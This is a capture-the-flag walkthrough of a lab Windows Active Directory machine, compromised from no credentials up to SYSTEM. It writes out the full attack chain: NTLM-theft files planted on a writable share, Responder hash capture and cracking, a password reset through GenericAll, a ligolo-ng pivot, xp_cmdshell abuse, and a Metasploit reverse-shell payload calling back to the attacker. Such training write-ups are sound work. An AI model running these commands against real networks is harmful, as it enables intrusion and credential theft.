# [HackSmarter.org - ShareThePain](https://www.hacksmarter.org/courses/63bc86e1-3ab3-43be-b32e-62a676e6dee7/take)

![fd095f0615631c90b4b913584c307b6a.png](/resources/fd095f0615631c90b4b913584c307b6a.png)

## Table of Contents

- [Abstract](#abstract)
- [Scope and Objective](#scope-and-objective)
- [Enumeration](#enumeration)
- [Obtaining password of bob.ross via NTLM Theft](#obtaining-password-of-bobross-via-ntlm-theft)
- [Initial Access as alice.wonderland](#initial-access-as-alicewonderland)
- [Pivoting with ligolo-ng](#pivoting-with-ligolo-ng)
- [MSSQL Exploitation to get shell as sqlexpress](#mssql-exploitation-to-get-shell-as-sqlexpress)
- [Privilege Escalation via SeImpersonatePrivilege](#privilege-escalation-via-seimpersonateprivilege)

***
## Abstract
ShareThePain is a medium-difficulty Windows Active Directory machine released by Hack Smarter which does not provided any credential unlike other labs so we will need to start enumerating the domain from nothing to fully compromise the machine. 

This machine have non standard share that allow any user to write and read any files in it and we can upload payload generate by [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) to this share and "bob.ross" user who regularly review it will open a file and let us crack password of his password.

"bob.ross" user has "GenericAll" right over "alice.wonderland" user which is a member of "Remote Management Users" so we can changed the password of this user and gain foothold on the machine.

Microsoft SQL service is also running on the machine but can not access it from outside so pivoting is needed and once established a tunnel, "alice.wonderland" can be used to login to MSSQL service which it has sysadmin privileges on the SQL Server which then we can use xp_cmdshell to obtain a shell as sqlexpress user then abuse its SeImpersonatePrivilege to become SYSTEM on the machine.

## Scope and Objective
**Objective**: You're a penetration tester on the Hack Smarter Red Team. Your mission is to infiltrate and seize control of the client's entire Active Directory environment. This isn't just a test; it's a full-scale assault to expose and exploit every vulnerability.

**Initial Access**: For this engagement, you've been granted direct access to the internal network but no credentials.

**Execution**: Your objective is simple but demanding: enumerate, exploit, and own. Your ultimate goal is not just to get in, but to achieve a full compromise, elevating your privileges until you hold the keys to the entire domain.

## Enumeration

I will start with rustscan to NORTHJMP01 host first since it is faster than nmap and VPN connection can tolerate this much of traffic unlike HTB. (I could not use rustscan could not be used on HTB) and we can see that there are a lot of ports opened as expected of the machine that is the domain controller
```
rustscan -a $IP -- -A
```
![cf1021d657f72a99f8682e53976c76d0.png](/resources/cf1021d657f72a99f8682e53976c76d0.png)

The certificate give us more info about the hostname and the domain which we could add them to our hosts file so now we will use the domain name / hostname instead of specifying an IP address unless we need to

![6712f2844578143a8bde51f30aadf789.png](/resources/6712f2844578143a8bde51f30aadf789.png)

Since we do not have anything yet and no website is hosting on this machine, I use NetExec to authenticate to the domain controller with anonymous authentication and we can see that there is 1 non-standard share that allow "everyone" to read and write files in it 

```
uv run nxc smb hack.smarter -u '' -p '' --shares
```
![1de1de8f6d9917240a24b12b0736ebad.png](/resources/1de1de8f6d9917240a24b12b0736ebad.png)

But once we connected to this share, there is nothing there so we will need to use another method to find a way in

```
smbclient \\\\hack.smarter\\Share -N
```
![9b65c5423b56cc7441721315c1385b7e.png](/resources/9b65c5423b56cc7441721315c1385b7e.png)

## Obtaining password of bob.ross via NTLM Theft

I will generate special payload that will callback to my machine via [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) and upload to this special share to see if there is any user that interacting with file inside the share.

```
python ntlm_theft.py -g all -s $YOUR_IP -f important 
```

![aa840003a96c853a298e917cfadd9653.png](/resources/aa840003a96c853a298e917cfadd9653.png)

Now I will start up my responder to wait for authentication over SMB which if any user interact with the file I will upload then we can retrieve NTLMv2 hash of that user from this tool and once I uploaded a a shortcut file, I was able to retrieve the NTLMv2 hash of "bob.ross" right away.

```
sudo responder -I tun0 
```

![70baf8a311ba55545a864e27960edf88.png](/resources/70baf8a311ba55545a864e27960edf88.png)

Using `rockyou.txt` wordlist, we can recover password of this user which is "137Password123!@# "

```
john --wordlist=/usr/share/wordlists/rockyou.txt bobhash
```
![cd184ff5618bf0497395e3bc4470c918.png](/resources/cd184ff5618bf0497395e3bc4470c918.png)

Now we have a valid domain user to enumerate the domain further

```
uv run nxc smb hack.smarter -u 'bob.ross' -p '137Password123!@#' --shares
```
![242df90cc695f681a3f0cc12e3b61720.png](/resources/242df90cc695f681a3f0cc12e3b61720.png)

I will also pull a valid domain user list to a new text file first so if I obtained a new hash or a password then I can only spray on the valid domain user but look like there are only 2 non-default users beside "bob.ross" here 

```
uv run nxc ldap hack.smarter -u 'bob.ross' -p '137Password123!@#' --users-export user.txt
```
![55b58a6bcf2ea8435984ea1048287811.png](/resources/55b58a6bcf2ea8435984ea1048287811.png)

I use rusthound to retrieve domain information and that can be used to visualize the dangerous relationship between each domain object on the bloodhound

```
rusthound-ce -d hack.smarter -u 'bob.ross' -p '137Password123!@#' -z
```
![a4aee681f0a56031b4b40386076f4897.png](/resources/a4aee681f0a56031b4b40386076f4897.png)

## Initial Access as alice.wonderland

The bloodhound results show that "bob.ross" has "GenericAll" right over "alice.wonderland" user which mean we can do anything to this user including reset its password and as we can see that the alice user is a member of "Remote Management Users" then we could use tool like evil-winrm or evil-winrm.py to gain a foothold on the machine

![015759858846cbacec0ca463e053e551.png](/resources/015759858846cbacec0ca463e053e551.png)

I will use bloodyAD to change the password of "alice.wonderland" and now we should be able to foothold the machine as indicates by "Pwn3d!" sign via NetExec over WinRM protocol

```
bloodyAD --host $IP -d "hack.smarter" -u "bob.ross" -p '137Password123!@#' set password "alice.wonderland" "Password123"
```
![a8426045b426eec404dd4d1ac189cb2f.png](/resources/a8426045b426eec404dd4d1ac189cb2f.png)

I will use evil-winrm to foothold and loot user flag located on the desktop of this user

```
evil-winrm -i hack.smarter -u "alice.wonderland" -p "Password123"
```
![f163716a2ba54d024030f31b088fce43.png](/resources/f163716a2ba54d024030f31b088fce43.png)

## Pivoting with ligolo-ng

Once inside, I discover MSSQL service while enumerating services via built-in evil-winrm feature but as we already see that we could not reach port 1433 from our machine which mean we will need to pivot first

![0f37f07a39f871e6a9e3d03e0e3eaf1d.png](/resources/0f37f07a39f871e6a9e3d03e0e3eaf1d.png)

I will use ligolo-ng to pivot, first I will create a new interface for ligolo-ng and start proxy server on the default port of ligolo-ng

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
cd /opt/ligolo
./lin-proxy -selfcert -laddr 0.0.0.0:11601 
```
![59732d0b74aaeb09368e9738b4e6b20e.png](/resources/59732d0b74aaeb09368e9738b4e6b20e.png)

Next I will upload an agent to the machine then connect back to ligolo proxy server
```
./win-agent.exe -connect <YOUR_IP>:11601 -ignore-cert
```
![42709caed613e510f06ebe2804722e7a.png](/resources/42709caed613e510f06ebe2804722e7a.png)

Since we need to access local port of the agent then we will need to add magic CIDR hardcoded in Ligolo-ng: 240.0.0.0/4 as documented in [Ligolo-ng documentation](https://docs.ligolo.ng/Localhost/)

```
sudo ip route add 240.0.0.1/32 dev ligolo
```

Now we can start tunneling on the interface we just created and added route
```
start --tun ligolo
```

Now we can use the "240.0.0.1" as our target and connect to MSSQL service which we can see that "alice.wonderland" have sysadmin privileges on the SQL Server so we can execute commands via `xp_cmdshell`

```
uv run nxc mssql 240.0.0.1 -u 'alice.wonderland' -p 'Password123'
```
![ace8288043ad7ea32863c616511be455.png](/resources/ace8288043ad7ea32863c616511be455.png)

## MSSQL Exploitation to get shell as sqlexpress

I will first execute normal SQL query to see if there is any interesting database but seem like there is none

```
uv run nxc mssql 240.0.0.1 -u 'alice.wonderland' -p 'Password123' -q 'SELECT name FROM master.dbo.sysdatabases;'
```
![ed20c34767996297e28b9125185be7d0.png](/resources/ed20c34767996297e28b9125185be7d0.png)

Next, I will check the current privilege of the user that is running MSSQL service which we can see that it is the default sqlexpress user running this service which we can abuse SeImpersonatePrivilege to become SYSTEM user on the domain controller at the end

```
uv run nxc mssql 240.0.0.1 -u 'alice.wonderland' -p 'Password123' -x 'whoami /priv'
```
![8afcb97ca797b6c740ebca74f2523e2a.png](/resources/8afcb97ca797b6c740ebca74f2523e2a.png)

I will fire up my Metasploit and quickly generate PowerShell payload via web delivery module

```
msfconsole -q
use exploit/multi/script/web_delivery
set target 2
set payload windows/x64/meterpreter/reverse_tcp
set lhost <YOUR_IP>
run
```
![01c2607ce672fa6c229d0f905ca53e53.png](/resources/01c2607ce672fa6c229d0f905ca53e53.png)

Using NetExec to execute command via xp_cmdshell, now we should have meterpreter session on metasploit

![6c0e258baa46a1e0a31b0f82d2592888.png](/resources/6c0e258baa46a1e0a31b0f82d2592888.png)

## Privilege Escalation via SeImpersonatePrivilege

Once we are on the meterpreter, we can just simply use built-in `getsystem` command and become SYSTEM user

```
getsystem
```
![a26e135774ab4e2203e5b35c4bc3d507.png](/resources/a26e135774ab4e2203e5b35c4bc3d507.png)

Now we can go to the desktop of administrator user to loot root flag

![cca9cecd26a131a3c0240866fe16dcb9.png](/resources/cca9cecd26a131a3c0240866fe16dcb9.png)

And now we are done :D

***
